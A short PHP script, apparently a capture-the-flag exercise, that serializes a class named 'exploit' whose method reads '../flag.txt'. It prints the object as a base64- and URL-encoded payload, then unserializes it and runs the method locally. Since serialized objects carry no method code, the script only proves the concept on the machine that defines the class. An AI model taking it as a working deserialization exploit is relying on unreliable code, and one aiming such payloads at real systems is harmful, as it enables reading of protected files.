<?php

class exploit
{
  function is_admin(){
    $flag = file_get_contents('../flag.txt');
    setcookie("flag", $flag);
    echo $flag;
    return $flag;
  }
}

$exploit = new exploit();
$st = serialize($exploit);
$stbase = base64_encode($st);
echo 'stbase: ';
echo $stbase;
echo PHP_EOL;
$stbase_encode_url = urlencode($stbase);
echo 'stbase_encode_url: ';
echo $stbase_encode_url;
echo PHP_EOL;
$perm_urldecode = urldecode($stbase_encode_url);
$perm_base64_decode = base64_decode($perm_urldecode);
$perm = unserialize($perm_base64_decode);
$perm->is_admin();
?>

